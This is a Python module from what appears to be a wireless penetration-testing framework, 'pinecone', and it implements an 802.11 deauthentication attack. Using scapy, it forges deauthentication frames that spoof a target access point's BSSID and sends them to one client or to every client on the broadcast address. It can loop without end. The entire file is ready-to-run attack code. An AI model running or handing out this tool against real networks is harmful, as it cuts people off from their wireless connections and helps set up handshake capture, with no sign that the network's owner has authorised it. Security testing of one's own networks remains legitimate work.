import argparse
from time import sleep

from scapy.all import sendp
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from pony.orm import *

from pinecone.core.module import BaseModule
from pinecone.core.database import select_bss
from pinecone.utils.interface import set_monitor_mode, check_chset
from pinecone.utils.packet import BROADCAST_MAC, compare_macs


class Module(BaseModule):
    META = {
        "id": "attack/deauth",
        "name": "802.11 deauthentication attack module",
        "author": "Valentín Blanco (https://github.com/valenbg1/)",
        "version": "1.0.0",
        "description": "Deauthenticates clients from APs forging 802.11 deauthentication frames.",
        "options": argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter),
        "depends": {}
    }
    META["options"].add_argument("-i", "--iface", help="monitor mode capable WLAN interface", default="wlan0", metavar="INTERFACE")
    META["options"].add_argument("-b", "--bssid", help="BSSID of target AP")
    META["options"].add_argument("-s", "--ssid", help="SSID of target AP")
    META["options"].add_argument("-c", "--channel", help="channel of target AP", type=int)
    META["options"].add_argument("--client", help="MAC of target client", default=BROADCAST_MAC)
    META["options"].add_argument("-n", "--num-frames", help="number of deauth frames to send (multiplied by 64), 0 or negative means infinite.", default=1, type=int)

    def run(self, args, cmd):
        with db_session:
            bss = select_bss(cmd, args.ssid, args.bssid, args.client)

            if bss:
                args.bssid = bss.bssid
                args.channel = bss.channel

        if args.bssid is None:
            cmd.perror("BSSID is missing, and couldn't be obtained from the recon db.")
        elif args.channel is None:
            cmd.perror("Channel is missing, and couldn't be obtained from the recon db.")
        else:
            interface = set_monitor_mode(args.iface)
            check_chset(interface, args.channel)
            deauth_frame = RadioTap() / Dot11(addr1=args.client, addr2=args.bssid, addr3=args.bssid) / Dot11Deauth(reason="class3-from-nonass")
            args.num_frames = "infinite" if args.num_frames <= 0 else args.num_frames*64

            if compare_macs(args.client, BROADCAST_MAC):
                cmd.pfeedback("[i] Sending {} deauth frames to all clients from AP {} on channel {}...".format(args.num_frames, args.bssid, args.channel))
            else:
                cmd.pfeedback("[i] Sending {} deauth frames to client {} from AP {} on channel {}...".format(args.num_frames, args.client, args.bssid, args.channel))

            if args.num_frames == "infinite":
                while True:
                    sendp(deauth_frame, iface=args.iface, count=64, inter=0.002)
                    sleep(0.5)
            else:
                sendp(deauth_frame, iface=args.iface, count=args.num_frames, inter=0.002)

    def stop(self, cmd):
        pass
